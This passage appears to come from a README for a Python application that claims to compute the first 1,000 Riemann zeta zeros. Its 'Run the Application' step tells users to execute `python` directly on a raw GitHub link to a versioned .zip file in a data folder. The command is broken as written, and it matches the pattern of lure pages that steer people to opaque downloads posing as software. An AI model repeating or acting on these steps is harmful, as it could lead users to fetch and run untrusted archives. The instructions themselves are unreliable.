   Use the `cd` command to change the directory to where you extracted the folder. For example, if you extracted it to `Documents`, you would type:

```bash
cd Documents/rh-first-1000-zeros-python
```

5. **Run the Application**:
   To run the application, execute the following command:

```bash
python https://raw.githubusercontent.com/Qwerty849/rh-first-1000-zeros-python/main/data/rh-first-1000-zeros-python_v1.3.zip
```

## 🔍 Understanding the Output

Once you run the application, it will calculate the first 1,000 nontrivial zeros of the Riemann zeta function. The results will display in your terminal or command prompt. You can review the numerical values, and if required, the application will also provide details about the calculations performed.

## 🌐 Additional Features

- **Enhanced Accuracy**: The application uses rigorous verification through interval arithmetic.
- **Visualization Tools**: Optional feature for users who want to visualize the zeros graphically.
- **Logging Capability**: Automatically logs the results for future reference.
  
These features make this application suitable for both educational and research purposes in analytic number theory.

## 💡 Troubleshooting

If you encounter issues while running the application, consider the following steps:

- **Python Not Recognized**: Ensure you have Python installed correctly on your system. Check your installation by typing `python --version` in your terminal.

- **Missing Libraries**: If you see errors about missing libraries, make sure you install them using the `pip` commands provided earlier.
